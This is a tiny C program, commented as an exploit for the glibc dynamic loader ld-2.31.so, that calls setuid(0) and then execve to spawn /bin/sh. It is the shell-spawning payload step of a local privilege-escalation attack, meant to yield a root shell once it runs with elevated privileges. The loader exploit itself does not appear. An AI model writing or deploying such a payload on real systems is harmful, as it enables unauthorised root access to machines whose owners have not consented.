#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

/* /lib/ld-2.31.so exp */
int main(void)
{
    char *argv[] = {"/bin/sh", 0};
    setuid(0);
    execve("/bin/sh", argv, NULL);
    return 0;
}
